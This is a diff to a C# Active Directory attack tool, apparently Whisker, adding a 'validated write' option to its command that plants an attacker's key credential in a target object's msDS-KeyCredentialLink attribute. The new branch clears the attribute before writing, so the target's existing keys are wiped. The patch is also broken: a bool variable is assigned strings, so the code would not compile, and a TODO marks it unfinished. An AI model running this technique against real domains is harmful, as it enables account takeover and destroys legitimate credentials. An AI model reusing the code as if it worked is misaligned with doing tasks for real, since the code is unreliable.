@@ -295,6 +295,7 @@ This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter)
                 string dc;
                 string path;
                 string password;
+                bool vw; // to enable validated write mode
                 Guid deviceID = Guid.Empty;
 
                 if (!arguments.ContainsKey("target") || String.IsNullOrEmpty(arguments["target"]))
@@ -374,10 +375,19 @@ This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter)
                     password = arguments["password"];
                 }
 
+                if (!arguments.ContainsKey("vw") || String.IsNullOrEmpty(arguments["vw"]))
+                {
+                    vw = "";
+                }
+                else
+                {
+                    vw = arguments["vw"];
+                }                
+
                 switch (command)
                 {
                     case "add":
-                        Add(target, domain, dc, path, password);
+                        Add(target, domain, dc, path, password, vw);
                         break;
                     case "remove":
                         Remove(target, domain, dc, deviceID);
@@ -400,7 +410,7 @@ This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter)
             }
         }
 
-        static void Add(string target, string fqdn, string dc, string path, string password)
+        static void Add(string target, string fqdn, string dc, string path, string password, bool vw)
         {
             if (String.IsNullOrEmpty(path))
             {
@@ -431,10 +441,22 @@ This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter)
 
             try
             {
-                Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");
-                targetObject.Properties["msDS-KeyCredentialLink"].Add(keyCredential.ToDNWithBinary());
-                targetObject.CommitChanges();
-                Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
+                // TODO: if vw switch is specified clear the msDS-KeyCredentialLink before adding. Also ensure vw is actually a switch 
+                if (vw)
+                {
+                    Console.WriteLine("[*] ValidatedWrite the msDS-KeyCredentialLink attribute of the target object");
+                    targetObject.Properties["msDS-KeyCredentialLink"].Clear();
+                    targetObject.Properties["msDS-KeyCredentialLink"].Add(keyCredential.ToDNWithBinary());
+                    targetObject.CommitChanges();
+                    Console.WriteLine("[+] ValidatedWrote the msDS-KeyCredentialLink attribute of the target object");
+                }
+                else
+                {
+                    Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");
+                    targetObject.Properties["msDS-KeyCredentialLink"].Add(keyCredential.ToDNWithBinary());
+                    targetObject.CommitChanges();
+                    Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
+                }
             }
             catch (Exception e)
             {
